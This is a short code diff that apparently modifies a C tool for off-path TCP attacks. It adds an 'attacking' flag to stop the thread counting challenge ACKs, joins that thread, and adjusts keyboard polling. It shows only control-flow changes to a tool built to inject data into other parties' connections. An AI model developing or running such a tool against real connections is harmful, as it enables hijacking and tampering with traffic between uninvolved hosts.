@@ -117,6 +117,7 @@ typedef struct thctx_struct {
 	char *inject_client;
 	off_t inject_client_len;
 	int client_mode;
+	int attacking;
 } thctx_t;
 
 /* for probing groups of values, limited by PACKETS_PER_SECOND */
@@ -653,7 +654,7 @@ void *recv_thread(void *arg)
 	size_t datalen;
 
 	/* listen for challenge ACKs and count them */
-	while (1) {
+	while (g_ctx.attacking) {
 		pcret = pcap_next_ex(g_ctx.pch, &pchdr, &inbuf);
 		if (pcret == 1
 			&& tcp_recv(pchdr, inbuf, &flags, NULL, NULL, NULL, &datalen)
@@ -1871,6 +1872,8 @@ int conduct_offpath_attack(void)
 		return 0;
 	}
 
+	g_ctx.attacking = 1;
+
 	gettimeofday(&attack_start, NULL);
 
 	/* synchronize our processing with the remote host's clock */
@@ -1906,6 +1909,10 @@ int conduct_offpath_attack(void)
 		if (!inject_the_data())
 			return 0;
 	}
+
+	g_ctx.attacking = 0;
+	if (pthread_join(rth, NULL))
+		fprintf(stderr, "[!] pthread_join had an error!\n");
 
 	gettimeofday(&attack_end, NULL);
 	timersub(&attack_end, &attack_start, &diff);
@@ -2151,7 +2158,7 @@ int set_up_attack(void)
 			break;
 
 		/* check for keyboard input */
-		while (kbhit() == 1) {
+		while (pconn->state != CS_FINISHED && kbhit() == 1) {
 			int ch = getchar();
 
 			switch (ch)
